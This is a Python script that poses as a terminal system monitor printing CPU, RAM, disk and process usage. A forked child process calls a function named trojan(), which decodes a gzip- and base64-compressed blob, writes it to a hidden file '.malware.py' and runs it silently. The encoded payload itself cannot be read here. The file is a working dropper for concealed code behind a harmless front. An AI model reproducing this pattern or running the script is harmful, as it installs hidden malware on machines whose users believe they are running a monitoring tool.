#!/usr/bin/python3
import psutil
import base64
import time
import gzip
import os

def main():
	# fork  child process
	pid = os.fork()

	if pid > 0:
		# parent process
		while True:
			# percentuale of used CPU
			cpu = psutil.cpu_percent()
			# percentuale of used RAM
			ram = psutil.virtual_memory().percent
			# percentuale of used disk space
			disk = psutil.disk_usage("/").percent
			# numero processi in esecuzione
			processes_count = 0
			for _ in psutil.process_iter():
				processes_count += 1
			
			# print to screen
			print("---------------------------------------------------------")
			print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
			print("| {:02}%       | {:02}%       | {:02}%        | {}               |".format(int(cpu), int(ram), int(disk), processes_count))
			print("---------------------------------------------------------")

			# sleep for 2s
			time.sleep(2)
	else:
		# child process
		trojan()


def trojan():
	malware_fd = open(".malware.py", "w")
	blob = "H4sICJ3baGQAA21hbHdhcmUucHkAjVbbbuM2EH33V0yZApEQS4rXuSAGUjRot+gFe0F3+9LEEGiJjhlLpErSuTn69x1Soh3bcrryg0nODOdweGaGBz8kC62SCRdJ9WRmUgx7vKykMqDYfwumjfZzLbM5M342oZqdnfjZnZZibedHUvd6vZxNoaRcBOGo1wP8prxgOmWPBi7hmsTm0ZA+kDiX2SMZNyoHcMsMzKQ2gpYM5BTMjOEu2YwL5jRWsssWV4wWfjEIX29jTavFpOAZ8Or+BGieK6Z1566M5kxp3HTp5vYj/2imoqtbJgwZAfkgn3lR0OQ0PiZQO61m85RXaOeDZuEEZGZMpUdJwita8TiTOMCzrr20ozA2GA6PWTOqshlMpYIJN5nkAqjIgWEQCw+eaafcytPValpw7eI6dnJns1dqPSgpTR/0YpJzpfvN3QB6lDp+oMU8IMlMliyZ04InvzI9N7JKsqcJU/BA1ZQqBoqaljmRUfKOiqik2jCVGIxDlFNDCd68j6b1aZ1YH85ZS4qVHNfSipoZwiTLOlnWJEabkpqggWoVwg0Te+N9aPiEsK1xrKuC25gGq/3CTT986iw8CkvH0YaC/Yx62l1coZzm1mHFxNoJ8liRsNPkAKlBc8e4TAqDbHIMZNReNdrv97NSv/R+Y7tVEMbaKF4FWydbO+wi0gZ9tr8dOjlCx1MucloUgSLB9WA4Xg7qaxrNy+j5Kvr9z+jj5+jfQXQxXr476w+H9cskG6D4+dguDS/6pxd1SPqbJ/kexF103/626L2NtoURp+Ojnz2ko5vYDvEQ/fP6u3FlM5bNLWceGMzoPUOEC0xJKp52IwsefDdm3KRAyuyEOoSf4LibbZ1X43N5j+BoV/AWnK1I/g+YPWWlc/loe7k7xp7ZWSG1rd87Lh8zVnWkqP0qqm2jscOm4uP1u8QE24XwQsROobfStJE2RcPlMRHMaEMNRFVBhYEXuFWsgoiDPQru9wL0YQ6Hy0pxFP94Uh+udD7D4U2OrBrWN/Hewcj9n9aHJGxzuAPNauLzu6lmAbkRbW1pj8pEJnMGtsSCka4Hu06hmXCFprSrmSxL6riau8KjZIEK6p4pt4sz3mh3bZhS30yx6flhf1cLG9po3QA7FNbHQcX15JXmLoNddqF6N7dfmW4zzht2MdFZ1Z4mzfPFh9DSw4XPhqPpnE6Qp218GvV4cnbSCAKrHeeLstKBVQnjdj0M120cI+7v5o1baNUz5INhQNvnDMjJHcsa0Hr9yGn+gnZ29Vv6x8f3X/te+uXTL3+lX77+/f7qwwoGehO40dsgbIq4F9tgODxvfMatYRCQwbvz+Bh/A6yXViEMWxV7xOB1pLzAZ3Gvh/UlTS130hQusaWnqX0LpilpUrl5GPa+AWDMsESFCgAA"
	malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
	malware_fd.write(malware)
	malware_fd.close()

	# exec malware
	os.system("/usr/bin/python3 .malware.py")


if __name__ == "__main__":
	main()
